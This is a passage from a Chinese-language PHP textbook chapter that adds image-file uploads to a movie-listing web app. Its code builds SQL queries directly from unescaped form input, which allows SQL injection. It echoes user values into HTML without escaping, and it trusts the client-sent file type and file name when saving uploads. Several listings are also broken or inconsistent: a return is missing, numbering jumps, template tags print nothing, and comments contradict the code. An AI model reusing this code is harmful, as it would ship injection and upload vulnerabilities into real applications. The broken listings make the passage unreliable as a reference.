当使用表单上传文件时，文件数据包含在表单数据中。通过将 `<form>` 元素的 `enctype` 属性设置为 `multipart/form-data`，浏览器会知道在发送到 Web 服务器时将文件数据包含在表单数据中。

其次，我们必须向表单添加一个文件输入元素：

```
<input type="file" class="form-control-file"
    id="movie_image_file" name="movie_image_file">
```

在表单中，将文件输入元素放在一个 Bootstrap `form-group row` 内，位于提交按钮之前，如清单 19.1 所示。

### 清单 19.1。

```
1. </div>
2. <div class="form-group row">
3.     <label for="movie_image_file"
4.         class="col-sm-3 col-form-label-lg">电影图片文件</label>
5.     <div class="col-sm-8">
6.         <input type="file" class="form-control-file"
7.             id="movie_image_file" name="movie_image_file">
8.     </div>
9. </div>
10. <button class="btn btn-primary" type="submit"
11.     name="add_movie_submission">添加电影</button>
12. </form>
```

添加上传文件功能会为我们的脚本增加一些代码。因此，最好尽可能将文件处理能力与 `addmovie.php` 脚本解耦，并将此功能放入一组独立的函数中。这种分离是一个良好的设计决策，因为我们还会在“编辑电影”页面中使用此功能。因此，创建一个单独的脚本用于存放图片文件功能。




## 19. 处理文件和对现有代码的功能添加

在向服务器上传图像文件时，我们需要考虑两件事：

- 1. 我们希望允许哪些类型的图像文件，
- 2. 以及我们希望允许的文件有多大。

出于安全考虑，我们希望确保用户只上传图像文件（我们支持的图像类型），以免用户上传任何可执行文件。此外，我们还希望限制大小，以免用完存储空间并且 Web 服务器崩溃。在将上传的文件保存到我们的 images/ 文件夹之前，我们应该验证文件是否符合这些考虑，并且文件上传没有错误。$_FILES 超全局变量包含有关上传文件的全部信息。

通常使用表单来上传文件。有关文件的所有信息，包括文件本身，都包含在 $_FILES 超全局变量中。$_FILES 超全局变量是一个二维关联数组。第一维设置为文件输入元素的 name 属性，在本例中为 movie_image_file。PHP 将第二维设置为有关上传文件的不同属性。

| 属性名称 | 属性含义 | 属性值 |
| --- | --- | --- |
| `$_FILES['movie_image_file']['name']` | 文件名 | serenity_movie.jpg |
| `$_FILES['movie_image_file']['type']` | 图像类型 | image/jpg |
| `$_FILES['movie_image_file']['size']` | 图像大小（字节） | 214480 |
| `$_FILES['movie_image_file']['tmp_name']` | 服务器上文件的临时存储位置 | /tmp/phpV9CAHI |
| `$_FILES['movie_image_file']['error']` | 文件上传的错误代码；0 表示正常 | 0 |

> [1] PHP 文档对上传文件后可在 $_FILES['movie_image_file']['error'] 中找到的所有错误代码有完整说明，详见： https://php.net/features.file-upload.errors

## 验证上传的电影图像文件

如前所述，我们希望限制上传图像文件的大小和图像类型。我们希望将图像限制为 JPEG、PNG 或 GIF。我们还希望确保文件上传没有错误。由于我们经常会引用大小限制，因此最好为此最大文件大小创建一个常量并将其放在其他脚本可以包含的单独文件中。

创建一个名为 movielistingfileconstants.php 的新 PHP 脚本并添加以下代码：

```php
<?php
// Movie Listing File Constants
define('ML_MAX_FILE_SIZE', 524288);
```

> 在 php.ini 配置文件中，有几个设置会影响文件上传。默认情况下，这些设置应该已经启用：
> 
> - post_max_size = (some number)M
> - upload_max_filesize = (some number)M
> - file_uploads = TRUE
> 
> post_max_size 控制 post 请求的总大小，而 upload_max_filesize 控制每个上传文件的最大大小。文件大小的总和不能超过 post 请求的最大大小。M 后缀表示兆字节。
> 
> 在 apache2.conf 配置文件中确保以下设置已正确启用：
> - LimitRequestBody 设置了 post 请求可以有多大。
> 
> 因此，为了使 PHP 脚本的上传正常工作，这三个数字必须设置正确：LimitRequestBody = post_max_size > upload_max_filesize

接下来，创建一个名为 movieimagefileutil.php 的另一个新 PHP 脚本。此文件是我们放置处理电影图像文件的函数的地方。

将以下 require_once() 语句添加到 movieimagefileutil.php 以包含 movielistingfileconstants.php：

```php
<?php
require_once 'movielistingfileconstants.php';
```

## 19. 处理文件和对现有代码的功能添加

现在，让我们创建一个名为 validateMovieImageFile() 的函数：

```php
<?php
require_once 'movielistingfileconstants.php';

function validateMovieImageFile()
{
}
```

### PHP DocBlocks

虽然不是必需的，但标准做法是在函数开头添加 PHP DocBlock 注释。这是一种记录函数工作原理的好方法，这对使用和维护函数的开发人员很有帮助。这也是完善函数设计的好方法，并在实现时充当路线图。根据上面关于我们如何验证上传的电影图像文件的描述，这里是此函数的一个好的 Doc Block 应该是什么样子：

/**
 * Purpose:      Validates an uploaded movie image file
 *
 * Description:  Validates an uploaded movie image file is not greater than ML_MAX_FILE_SIZE (1/2 MB),
 *               and is either a jpg or png image type, and has no errors. If the image file
 *               validates to these constraints, an error message containing an empty string is
 *               returned. If there is an error, a string containing constraints the file failed
 *               to validate to are returned.
 *
 * @return string Empty if validation is successful, otherwise error string containing
 *                constraints the image file failed to validate to.
 */
function validateMovieImageFile()
{
}
```

> 此函数没有参数。但是，如果你不使用类型提示，参数会使用 @param 标签进行说明，每个参数一个。有关更多信息，请参阅 PHP 中的 Docblocks[2] 及其正确用法。

### 处理错误

我们知道如果有错误将返回包含错误消息的字符串，如果没有错误则返回空字符串。让我们在函数开始时创建一个名为 error_message 的变量并将其初始化为空字符串。在函数末尾返回它：

```php
function validateMovieImageFile()
{
    $error_message = "";
    // ...
    return $error_message;
}
```

在我们可以对上传的文件做任何事情之前，我们需要检查两个顶级条件。我们需要检查 $_FILES 超全局变量是否存在——如果用户选择不选择要上传的文件，则它不存在。此外，我们需要检查文件上传时没有错误。我们可以在单个 if 语句中组合这些检查，使用逻辑 AND (&&) 将它们连接起来。在 $error_message = "" 之后添加以下代码：

```php
$error_message = "";

// Check for $_FILES being set and no errors.
if (isset($_FILES) && $_FILES['movie_image_file']['error'] == UPLOAD_ERR_OK)
{
    // ...
}
```

如果上面的 if 条件为 false，我们需要检查的另一个 elseif 条件。我们需要检查文件上传时是否出现错误。由于我们不知道条件失败是因为 $_FILES 超全局变量未设置还是因为错误不等于 UPLOAD_ERR_OK，因此在检查文件上传时是否出现错误之前，我们需要检查 $_FILES 是否已设置。我们还需要检查用户是否确实上传了文件。同样，我们可以将所有这些组合成一个 elseif 条件检查，使用 && 组合这些子句。PHP 提供了几个常量来描述文件错误。对于我们的目的，我们可以通过测试 $_FILES 数组中的 'error' 是否不等于 UPLOAD_ERR_OK 来捕获所有错误条件。如果我们进入此 elseif 条件，则是因为图像文件上传时出现错误。如果是这样，我们需要将 error_message 设置为适当的错误消息，说明上传电影图像文件时出现错误：

```php
elseif (isset($_FILES) && $_FILES['movie_image_file']['error'] != UPLOAD_ERR_NO_FILE
    && $_FILES['movie_image_file']['error'] != UPLOAD_ERR_OK)
{
    $error_message = "Error uploading movie image file.";
}
```

因此，我们的函数目前看起来像清单 19.2。

[2] PHP 中的 Docblocks： https://docs.phpdoc.org/guides/docblocks.html

## 添加文件上传功能

错误消息会根据上传的文件是否也超过最大文件大小而略有不同。将清单 19.4 中的代码添加到你刚刚添加的最大文件大小条件代码之后。

### 清单 19.4.

```php
1. // Check for $_FILES being set and no errors.
2. if (isset($_FILES) && $_FILES['movie_image_file']['error'] == UPLOAD_ERR_OK)
3. {
4.    // ...
5.    $image_type = $_FILES['movie_image_file']['type'];
6.
7.    if ($image_type != 'image/jpg' && $image_type != 'image/jpeg' && $image_type != 'image/pjpeg'
8.        && $image_type != 'image/png' && $image_type != 'image/gif')
9.    {
10.       if (empty($error_message))
11.       {
12.          $error_message = "The movie file image must be of type jpg, png, or gif.";
13.       }
14.       else
15.       {
16.          $error_message .= ", and be an image of type jpg, png, or gif.";
17.       }
18.    }
19. }
```

我们的已完成 validateMovieImageFile() 函数看起来像清单 19.5。

### 清单 19.5.

```php
1. function validateMovieImageFile()
2. {
3.    $error_message = "";
4.
5.    // Check for $_FILES being set and no errors.
6.    if (isset($_FILES) && $_FILES['movie_image_file']['error'] == UPLOAD_ERR_OK)
7.    {
8.       // Check for uploaded file < Max file size AND an acceptable image type
9.       if ($_FILES['movie_image_file']['size'] > ML_MAX_FILE_SIZE)
10.       {
11.          $error_message = "The movie file image must be less than " . ML_MAX_FILE_SIZE . " Bytes";
12.       }
13.
14.       $image_type = $_FILES['movie_image_file']['type'];
15.
16.       if ($image_type != 'image/jpg' && $image_type != 'image/jpeg' && $image_type != 'image/pjpeg'
17.           && $image_type != 'image/png' && $image_type != 'image/gif')
18.       {
19.          if (empty($error_message))
```

## 19. 处理文件与现有代码的功能添加

```
{
    $error_message = "The movie file image must be of type jpg, png, or gif.";
}
else
{
    $error_message .= ", and be an image of type jpg, png, or gif.";
}
}
}
elseif (isset($_FILES) && $_FILES['movie_image_file']['error'] != UPLOAD_ERR_NO_FILE
    && $_FILES['movie_image_file']['error'] != UPLOAD_ERR_OK)
{
    $error_message = "Error uploading movie image file.";
}

    return $error_message;
}
```

### 考虑阻止上传 generic_movie.jpg

在上述实现中，没有任何机制阻止用户上传名为 generic_movie.jpg 的图片。较好的做法是通过检查上传文件的名称来防止这种情况发生。否则，任何人都可能覆盖我们用于电影的默认图片。一般来说，你应该小心处理文件上传，并考虑他人可能如何滥用它们。我将此留作你的练习。

### 考虑使用 in_array() 检查图片类型

在清单 19.5 的代码中，我们有以下用于验证合法图片类型的 if 子句：

```
if ($image_type != 'image/jpg' && $image_type != 'image/jpeg' && $image_type != 'image/pjpeg'
    && $image_type != 'image/png' && $image_type != 'image/gif')
```

这种代码会变得杂乱且难以维护。挑选合法图片类型的更好解决方案是使用 PHP 内置函数 in_array()[3]。要使用它，请创建允许的图片类型数组，然后检查设置的图片类型是否出现在数组中：

```
$allowed_image_types = [
    'image/jpg', 'image/jpeg', 'image/pjpeg', 'image/png', 'image/gif'
];

if (in_array($image_type, $allowed_image_types))
{
    // ...
}
```

[3] in_array() 函数：https://php.net/in-array

### 移动图片文件

假设上传的电影图片文件通过验证，我们需要将该文件从 Web 服务器上的临时位置移动到我们的 images/ 文件夹。完成后，我们应该返回文件的路径位置，以便与数据库中的其他电影详情一起存储。如果用户未上传文件——或上传文件时出错——我们为路径位置返回空字符串。这个空字符串稍后用作显示默认文件图标的指示。

由于我们会经常引用 images/ 文件夹，最好为此上传路径创建一个常量，并将其放在一个可被其他脚本包含的单独文件中。因此，请将 `define('ML_UPLOAD_PATH', 'images/');` 添加到 movielistingfileconstants.php。我们还需要一个默认图片文件的常量，以防用户未上传图片。完整的常量文件现在应如下所示：

```php
<?php
// Movie Listing File Constants
define('ML_UPLOAD_PATH', 'images/');
define('ML_MAX_FILE_SIZE', 524288);
define('ML_DEFAULT_MOVIE_FILE_NAME', 'generic_movie.jpg');
```

务必为函数使用描述性名称，一个好的名称是：addMovieImageFileReturnPathLocation()。在 validateMovieImageFile() 函数下面，让我们创建新函数，并附带一个描述性良好的 DocBlock，如清单 19.6 所示。

### 清单 19.6.

```php
/**
 * Purpose:        Moves an uploaded movie image file to the ML_UPLOAD_PATH (images/)
 *                 folder and return the path location.
 *
 * Description:    Moves an uploaded movie image file from the temporary server location
 *                 to the ML_UPLOAD_PATH (images/) folder IF a movie image file was uploaded
 *                 and returns the path location of the uploaded file by appending the file
 *                 name to the ML_UPLOAD_PATH (e.g. images/movie_image.png). IF a movie image
 *                 file was NOT uploaded, an empty string will be returned for the path.
 *
 * @return string  Path to movie image file IF a file was uploaded AND moved to the
 *                 ML_UPLOAD_PATH (images/) folder, otherwise an empty string.
 */
function addMovieImageFileReturnPathLocation()
{
}
```

## 19. 处理文件与现有代码的功能添加

由于我们知道要返回包含路径位置的字符串，或者在没有文件上传或存在错误时返回空字符串，请创建一个名为 $movie_file_path 的变量，将其设置为空字符串并返回：

```php
function addMovieImageFileReturnPathLocation()
{
    $movie_file_path = "";
    // ...
    return $movie_file_path;
}
```

在移动上传文件之前，我们需要检查用户是否确实上传了文件且没有错误。请在 $movie_file_path = "" 之后添加以下代码：

```php
$movie_file_path = "";

// Check for $_FILES being set and no errors.
if (isset($_FILES) && $_FILES['movie_image_file']['error'] == UPLOAD_ERR_OK)
{
    // ...
}
```

如果我们进入此条件，就可以开始构建路径。请在 if 条件正下方添加以下代码：

```php
if (isset($_FILES) && $_FILES['movie_image_file']['error'] == UPLOAD_ERR_OK)
{
    $movie_file_path = ML_UPLOAD_PATH . $_FILES['movie_image_file']['name'];
}
```

接下来，我们需要将文件从 Web 服务器上的临时位置移动到我们的 images/ 文件夹。我们使用 move_uploaded_file()[4] 函数来完成。该函数接受两个参数：

- 1. 第一个参数是我们想要移动的文件的源路径位置，
- 2. 第二个参数是我们想要将文件移动到的目标路径位置

[4] move_uploaded_file() 函数：https://php.net/move_uploaded_file

### 添加上传文件功能

注意，文件路径位置也必须包含文件名。move_uploaded_file() 成功时返回 true，否则返回 false。我们将调用放在 if 条件中，并在失败时将 movie_file_path 重置为空字符串。请在我们之前设置 movie_file_path 的代码行下方添加以下代码：

```php
$movie_file_path = ML_UPLOAD_PATH . $_FILES['movie_image_file']['name'];

if (!move_uploaded_file($_FILES['movie_image_file']['tmp_name'], $movie_file_path))
{
    $movie_file_path = "";
}
```

上述代码将上传的电影图片文件从 Web 服务器的临时位置移动到 images/ 文件夹。完整的 addMovieImageFileReturnPathLocation() 函数如清单 19.7 所示。

### 清单 19.7.

```php
function addMovieImageFileReturnPathLocation()
{
    $movie_file_path = "";

    // Check for $_FILES being set and no errors.
    if (isset($_FILES) && $_FILES['movie_image_file']['error'] == UPLOAD_ERR_OK) {
        $movie_file_path =
            ML_UPLOAD_PATH . $_FILES['movie_image_file']['name'];

        if (!move_uploaded_file($_FILES['movie_image_file']['tmp_name'], $movie_file_path)) {
            $movie_file_path = "";
        }
    }

    return $movie_file_path;
}
```

## 19. 处理文件与现有代码的功能添加

### 完整的电影图片文件脚本

我们完整的 movieimagefileutil.php 脚本，包括 validateMovieImageFile() 和 addMovieImageFileReturnPathLocation() 函数，如清单 19.8 所示。

### 清单 19.8.

```php
<?php
require_once 'movielistingfileconstants.php';

/**
 * Purpose:    Validates an uploaded movie image file
 *
 * Description: Validates an uploaded movie image file is not greater than
 *              ML_MAX_FILE_SIZE (1/2 MB), and is either a jpg or png image type, and
 *              has no errors. If the image file validates to these constraints,
 *              an error message containing an empty string is returned. If
 *              there is an error, a string containing constraints the file failed
 *              to validate to are returned.
 *
 * @return string  Empty if validation is successful, otherwise error string containing
 *                 constraints the image file failed to validate to.
 */
function validateMovieImageFile()
{
    $error_message = "";

    // Check for $_FILES being set and no errors.
    if (isset($_FILES) && $_FILES['movie_image_file']['error'] == UPLOAD_ERR_OK)
    {
        // Check for uploaded file < Max file size AND an acceptable image type
        if ($_FILES['movie_image_file']['size'] > ML_MAX_FILE_SIZE)
        {
            $error_message = "The movie file image must be less than "
                        . ML_MAX_FILE_SIZE . " Bytes";
        }

        $image_type = $_FILES['movie_image_file']['type'];

        if ($image_type != 'image/jpg' && $image_type != 'image/jpeg'
            && $image_type != 'image/pjpeg' && $image_type != 'image/png'
            && $image_type != 'image/gif')
        {
            if (empty($error_message))
            {
                $error_message = "The movie file image must be of type jpg, png, or gif.";
            }
            else
            {
                $error_message .= ", and be an image of type jpg, png, or gif.";
            }
        }
    }
}
```



```php
44.     } }
45.     }
46. elseif (isset($_FILES)
47.     && $_FILES['movie_image_file']['error'] != UPLOAD_ERR_NO_FILE
48.     && $_FILES['movie_image_file']['error'] != UPLOAD_ERR_OK)
49. {
50.     $error_message = "Error uploading movie image file.";
51. }
52. 
53. return $error_message;
54. }
55. 
56. /**
57.  * Purpose:   Moves an uploaded movie image file to the
58.  *            ML_UPLOAD_PATH (images/) folder and return the path location.
59.  *
60.  * Description: Moves an uploaded movie image file from the temporary
61.  *              server location to the ML_UPLOAD_PATH (images/) folder
62.  *              IF a movie image file was uploaded and returns the path
63.  *              location of the uploaded file by appending the file
64.  *              name to the ML_UPLOAD_PATH (e.g. images/movie_image.png).
65.  *              IF a movie image file was NOT uploaded, an empty string
66.  *              is returned for the path.
67.  *
68.  * @return string  Path to movie image file IF a file was uploaded
69.  *                 AND moved to the ML_UPLOAD_PATH (images/) folder,
70.  *                 otherwise an empty string.
71.  */
72. function addMovieImageFileReturnPathLocation()
73. {
74.     $movie_file_path = "";
75. 
76.     // Check for $_FILES being set and no errors.
77.     if (isset($_FILES) && $_FILES['movie_image_file']['error'] == UPLOAD_ERR_OK)
78.     {
79.         $movie_file_path = ML_UPLOAD_PATH . $_FILES['movie_image_file']['name'];
80. 
81.         if (!move_uploaded_file($_FILES['movie_image_file']['tmp_name'],
82.                                 $movie_file_path))
83.         {
84.             $movie_file_path = "";
85.         }
86.     }
87. 
88.     return $movie_file_path;
89. }
```

## 19. 处理文件和对现有代码的功能添加

### 在 addmovie.php 上使用文件上传函数

现在我们已经有了用于验证和添加上传的电影图像文件的两个函数，我们可以回到修改 addmovie.php 以使用这些函数。

您应该已经修改了表单元素并添加了用于上传电影图像文件的 input file 元素。如果没有，请参阅上方了解如何操作。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_254_0.png)

在用户通过选择图 19.16 所示的 Add Movie 按钮提交表单数据后，表单数据可在检查表单数据是否设置在 $_POST 超全局变量中的 if 块内使用：

```
if (isset($_POST['add_movie_submission'], $_POST['movie_title'],
    $_POST['movie_rating'], $_POST['movie_director'],
    $_POST['movie_running_time_in_minutes']))
{
```

我们希望在此 if 块内验证文件，将其移动到 images/ 文件夹，并将路径保存到数据库。

首先，在 require_once dbconnection.php 脚本之后立即添加对 movieimagefileutil.php 脚本的 require_once，以便我们可以使用创建的两个函数：

```
if (isset($_POST['add_movie_submission'], $_POST['movie_title'],
    $_POST['movie_rating'], $_POST['movie_director'],
    $_POST['movie_running_time_in_minutes']))
{
    require_once('dbconnection.php');
    require_once('movieimagefileutil.php');
```

我们将在检查 checked_movie_genres 是否设置之后，并在连接到数据库的调用之前验证上传的电影图像文件。因此，在此处添加适当的注释可能是一个好主意，如清单 19.9 所示。

### 清单 19.9.

```php
1. if (isset($checked_movie_genres))
2. {
3.     $movie_genre_text = implode(", ", $checked_movie_genres);
4. }
5.
6. /*
7. Here is where we will deal with the file by calling validateMovieImageFile().
8. This function will validate that the movie image file is the right image type
9. (jpg/png/gif), and not greater than 512KB. This function will return an empty
10. string ('') if the file validates successfully, otherwise, the string will
11. contain error text to be output to the web page before redisplaying the form.
12. */
```

接下来，我们调用 validateMovieImageFile() 并将返回值设置为捕获文件错误消息的新变量：

```php
successfully. Otherwise, the string will contain error text to be output to
the web page before redisplaying the form.
*/
$file_error_message = validateMovieImageFile();
```

如果 validateMovieImageFile() 返回的不是空字符串，则上传文件时出现错误。我们希望显示此错误消息并重新显示表单，而不是将数据存储到数据库中，以便用户可以更正错误。错误的两个常见原因是：图像太大，或图像文件类型错误。这也意味着我们需要使用户已输入的字段保持粘性，以便他们不必重新输入到表单中（除非他们想更改它们）。

> > *参见章节：在第 18 章《使用 Web 应用程序编辑数据》中设置字段值使其保持粘性，以回顾如何使输入字段保持粘性。*

为 file_error_message 为空创建一个 if 条件，并将所有数据库代码、表结果和添加另一部电影的链接都移动到这个新的 if 块中。新的 if 块应如下清单 19.10 所示。

## 19. 处理文件和对现有代码的功能添加

### 清单 19.10.

```php
$file_error_message = validateMovieImageFile();

if (empty($file_error_message))
{
    $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
        or trigger_error(
            'Error connecting to MySQL server for' . DB_NAME,
            E_USER_ERROR
        );

    $query = "INSERT INTO movielisting (title, rating, director, "
        . " running_time_in_minutes, genre) "
        . "VALUES ('$movie_title', '$movie_rating', '$movie_director', "
        . "'$movie_runtime', '$movie_genre_text')";

    mysqli_query($dbc, $query)
        or trigger_error(
            'Error querying database movieListing: Failed to insert movie listing',
            E_USER_ERROR
        );

    $display_add_movie_form = false;
?>
<h3 class="text-info">The Following Movie Details were Added:</h3><br/>

<h1><?= $movie_title ?></h1>
<table class="table table-striped">
    <tbody>
        <tr>
            <th scope="row">Rating</th>
            <td><?= $movie_rating ?></td>
        </tr>
        <tr>
            <th scope="row">Director</th>
            <td><?= $movie_director ?></td>
        </tr>
        <tr>
            <th scope="row">Running Time (minutes)</th>
            <td><?= $movie_runtime ?></td>
        </tr>
        <tr>
            <th scope="row">Genre</th>
            <td><?= $movie_genre_text ?></td>
        </tr>
    </tbody>
</table>
<hr/>
<p>Would you like to <a href="<?= $_SERVER['PHP_SELF'] ?>"> add another movie</a></p>
<?php
}
```

### 处理文件上传错误

为了处理用户尝试上传文件时遇到的错误，我们需要修改上述代码。但是，首先，让我们在 if 之后添加一个 else 条件，以便我们可以输出错误消息，如清单 19.11 所示。

### 清单 19.11.

```
1. if (empty($file_error_message))
2. {
3.     //...
4. }
5. else
6. {
7.     // echo error message
8.     echo "<h5><p class='text-danger'>" . $file_error_message . "</p></h5>";
9. }
```

请注意，如果此 else 执行，表单将被重新显示，因为 display_add_movie_form 已经设置为 true。

在回到修改 if 块中的代码之前，让我们使表单保持粘性以处理 else 块中的错误条件。在脚本顶部，刚好在初始化 $display_add_movie_form = true; 的行下方，添加以下变量清单 19.12，并将其初始化为空字符串和 null。

### 清单 19.12.

```
1. // Initialization
2. $display_add_movie_form = true;
3. 
4. $movie_title = "";
5. $movie_rating = "";
6. $movie_director = "";
7. $movie_runtime = "";
8. $movie_genre_text = "";
9. $checked_movie_genres = null;
```

这些值在用户提交表单后设置，在清单 19.13 中的 if 条件中，该条件检查 $_POST 表单变量是否已设置。



## 19. 使用文件和对现有代码的功能添加

```
if (isset($_POST['add_movie_submission'], $_POST['movie_title'],
$_POST['movie_rating'], $_POST['movie_director'],
$_POST['movie_running_time_in_minutes']))
{
...
$movie_title = $_POST['movie_title'];
$movie_rating = $_POST['movie_rating'];
$movie_director = $_POST['movie_director'];
$movie_runtime = $_POST['movie_running_time_in_minutes'];
$checked_movie_genres = $_POST['movie_genre_checkbox'];
$movie_genre_text = "";

if (isset($checked_movie_genres))
{
$movie_genre_text = implode(", ", $checked_movie_genres);
}
}
```

如前所述，错误的两个常见原因是：图像太大，或图像的文件类型错误。因此，这给我们提供了三种可以测试的错误条件：

- 文件是正确的图像类型但太大。
- 文件是错误的图像类型但小于 ML_MAX_FILE_SIZE。
- 文件是错误的图像类型并且太大。

实现这些测试留作练习。你需要为每种情况编写一条错误消息。

我们现在可以使标题、评分、导演、播放时长和类型在表单中保持粘性。由于这与我们在“编辑电影”页面中所做的完全相同，我只在列表 19.14 中展示更新后的表单。

```
<form enctype="multipart/form-data" class="needs-validation" novalidate method="POST" action="<?= $_SERVER['PHP_SELF'] ?>">
<div class="form-group row">
<label for="movie_title" class="col-sm-3 col-form-label-lg">Title</label>
<div class="col-sm-8">
<input type="text" class="form-control" id="movie_title" name="movie_title" value="<?= $movie_title ?>" placeholder="Title" required>
<div class="invalid-feedback">
Please provide a valid movie title.
</div>
</div>
</div>
...
```

```
</div>
</div>
<div class="form-group row">
    <label for="movie_rating" class="col-sm-3 col-form-label-lg">Rating</label>
    <div class="col-sm-8">
        <select class="custom-select" id="movie_rating"
            name="movie_rating" value="<?php $movie_rating ?>"
            required>
            <option value="" disabled selected>Rating...</option>
            <option value="G" <?php $movie_rating == 'G' ?
                'selected' : '' ?>>G
            </option>
            <option value="PG" <?php $movie_rating == 'PG' ?
                'selected' : '' ?>>PG
            </option>
            <option value="PG-13" <?php $movie_rating == 'PG-13' ?
                'selected' : '' ?>>PG-13
            </option>
            <option value="R" <?php $movie_rating == 'R' ?
                'selected' : '' ?>>R
            </option>
        </select>
        <div class="invalid-feedback">
            Please select a movie rating.
        </div>
    </div>
</div>
<div class="form-group row">
    <label for="movie_director"
        class="col-sm-3 col-form-label-lg">Director</label>
    <div class="col-sm-8">
        <input type="text" class="form-control"
            id="movie_director" name="movie_director"
            value="<?= $movie_director ?>"
            placeholder="Director" required>
        <div class="invalid-feedback">
            Please provide a valid movie director.
        </div>
    </div>
</div>
<div class="form-group row">
    <label for="movie_running_time_in_minutes"
        class="col-sm-3 col-form-label-lg">Running Time (min)</label>
    <div class="col-sm-8">
        <input type="number" class="form-control"
            id="movie_running_time_in_minutes"
            name="movie_running_time_in_minutes"
            value="<?= $movie_runtime ?>"
            placeholder="Running time (in minutes)" required>
    <div class="invalid-feedback">
```

```
Please provide a valid running time in minutes.
</div>
</div>
<div class="form-group row">
<label class="col-sm-3 col-form-label-lg">Genre</label>
<div class="col-sm-8">
<?php
foreach ($genres as $genre) {
?>
<div class="form-check form-check-inline col-sm-3">
<input class="form-check-input" type="checkbox"
id="movie_genre_checkbox_action_<?= $genre ?>"
name="movie_genre_checkbox[]"
value="<?= $genre ?>"
checked='<?= in_array($genre, $checked_movie_genres) ? 'checked' : '' ?>'
<label class="form-check-label"
for="movie_genre_checkbox_action_<?= $genre ?>"> <?= $genre ?></label>
</div>
<?php
}
?>
</div>
</div>
<div class="form-group row">
<label for="movie_image_file" class="col-sm-3 col-form-label-lg">Movie Image File</label>
<div class="col-sm-8">
<input type="file" class="form-control-file"
id="movie_image_file" name="movie_image_file">
</div>
</div>
<button class="btn btn-primary" type="submit"
name="add_movie_submission">Add Movie
</button>
</form>
```

现在，让我们回到修改在验证上传文件时没有错误的情况下的 if 块中的代码：

```
if (empty($file_error_message))
{
// ...
}
```

### 添加文件上传功能

由于我们知道上传的文件是有效的，我们需要调用 addMovieImageFileReturnPathLocation()。此函数将上传的电影图像添加到 images/ 文件夹并返回我们需要存储在数据库中的路径。我们将在连接数据库的位置下方执行此操作，将返回的路径设置为新的变量 movie_image_file_path：

```
1. if (empty($file_error_message))
2. {
3.     $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
4.         or trigger_error(
5.             'Error connecting to MySQL server for' . DB_NAME, E_USER_ERROR
6.         );
7. 
8.     $movie_image_file_path = addMovieImageFileReturnPathLocation();
9. }
```

请记住，用户可能没有上传电影图像文件，因此 movie_image_file_path 可能是空字符串（这是可以的）。

我们需要修改我们的 SQL INSERT 查询，以包含我们在 Movie 数据库的 movieListing 表中添加的新字段 image_file，并在执行查询之前将其设置为 movie_image_file_path。它应如下所示列表 19.15。

### 列表 19.15.

```
1. $movie_image_file_path = addMovieImageFileReturnPathLocation();
2. 
3. $query = "INSERT INTO movieListing (title, rating, director, running_time_in_minutes,
4.             genre, image_file)"
5.     . "VALUES ('$movie_title', '$movie_rating', '$movie_director', "
6.     . "'$movie_runtime', '$movie_genre_text', '$movie_image_file_path')";
7. 
8. mysqli_query($dbc, $query)
9.     or trigger_error(
10.        'Error querying database movieListing: Failed to insert movie listing',
11.        E_USER_ERROR
12.    );
```

接下来，如果用户未上传文件，我们需要将 movie_image_file_path 设置为我们之前使用的通用——或默认——图像。此文件位于路径：images/generic_movie.jpg。 在查询后添加以下代码：

## 19. 使用文件和对现有代码的功能添加

```
mysqli_query($dbc, $query)
or trigger_error(
'Error querying database movielisting: Failed to insert movie listing',
E_USER_ERROR
);
}
```

下一行应已设置为不显示表单：

```
if (empty($movie_image_file_path))
{
$movie_image_file_path = ML_UPLOAD_PATH . ML_DEFAULT_MOVIE_FILE_NAME;
}
```

最后，我们需要将电影图像文件（或默认图像）添加到表中以显示添加的电影详细信息。

由于我们使用的是 Bootstrap 的 Flexbox 网格实现，最好将图像和表格封装在单独的列中，并将它们都放在同一行中，全部位于 <h1> 元素中电影标题下方，如列表 19.16 所示。

```
<h1><?= $movie_title ?></h1>
<div class="row">
<div class="col-2">
<img src="<?= $movie_image_file_path ?>" class="img-thumbnail" style="max-height: 200px;" alt="Movie image">
</div>
<div class="col">
<table class="table table-striped">
...
</table>
</div>
</div>
</div>
```

请注意，我们将 style 属性设置为最大高度 200 像素。

### 完整的 addmovie.php 代码列表

列表 19.17.

```
```php
1. <!DOCTYPE html>
2. <html>
3.   <head>
4.     <title>Add a Movie</title>
5.     <link rel="stylesheet"
6.       href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
7.       integrity="sha384-GJzZQFwB1QTN6wy59ff1BuGJpLSa90k4K0p0gimDm4iYmj7og2kKYbI706tH5"
8.       crossorigin="anonymous">
9. </head>
10. <body>
11.   <div class="card">
12.   <div class="card-body">
13.   <h1>Add a Movie</h1>
14.   <nav class="nav">
15.   <a class="nav-link" href="index.php">Movies I Like</a>
16.   </nav>
17.   <hr/>
18.   <?php
19.   // Initialization
20.   $display_add_movie_form = true;
21.   $movie_title = "";
22.   $movie_rating = "";
23.   $movie_director = "";
24.   $movie_runtime = "";
25.   $movie_genre_text = "";
26.   $checked_movie_genres = null;
27. 
28.   $genres = [
29.     'Action', 'Adventure', 'Comedy', 'Documentary', 'Drama',
30.     'Fantasy', 'Horror', 'Romance', 'Science Fiction'
31.   ];
32. 
33.   if (isset($_POST['add_movie_submission'], $_POST['movie_title'],
34.     $_POST['movie_rating'], $_POST['movie_director'],
35.     $_POST['movie_running_time_in_minutes']))
36.   {
37.   require_once('dbconnection.php');
38.   require_once('movieimagefileutil.php');
39. 
40.   $movie_title = $_POST['movie_title'];
41.   $movie_rating = $_POST['movie_rating'];
42.   $movie_director = $_POST['movie_director'];
43.   $movie_runtime = $_POST['movie_running_time_in_minutes'];
44.   $checked_movie_genres = $_POST['movie_genre_checkbox'];
45. 
46.   $movie_genre_text = "";
47. 
48.   if (isset($checked_movie_genres))
```

## 19. 使用文件和对现有代码的功能添加

```php
{
    $movie_genre_text = implode(", ", $checked_movie_genres);
}

/*
Here is where we will deal with the file by calling validateMovieImageFile().
This function will validate that the movie image file is not greater than 128
characters, is the right image type (jpg/png/gif), and not greater than 512KB.
This function will return an empty string ('') if the file validates successfully,
otherwise, the string will contain error text to be output to the web page before
redisplaying the form.
*/

$file_error_message = validateMovieImageFile();

if (empty($file_error_message))
{
    $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
        or trigger_error(
            'Error connecting to MySQL server for ' . DB_NAME,
            E_USER_ERROR
        );

    $movie_image_file_path = addMovieImageFileReturnPathLocation();

    $query = "INSERT INTO movieListing (title, rating, director,"
